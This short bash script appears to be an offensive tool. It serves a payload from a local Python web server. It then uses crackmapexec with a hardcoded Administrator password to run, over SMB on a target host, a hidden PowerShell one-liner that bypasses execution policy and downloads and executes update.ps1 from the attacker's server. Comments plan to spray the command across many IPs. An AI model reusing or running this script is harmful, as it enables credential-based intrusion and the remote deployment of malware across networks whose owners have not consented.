#!/bin/bash

# Test the server will be ran in the background
python -m http.server 6969&

# Will need to update to spray
# Get each ip from a different file, run this command in a for looop
crackmapexec smb 192.168.1.251 -u Administrator -p 'Mz2X&2$pHQb!' -x "powershell -nop -w hidden -ep bypass IEX (New-Object System.Net.WebClient).DownloadString('http://<CHANGE ME>:6969/update.ps1')"&
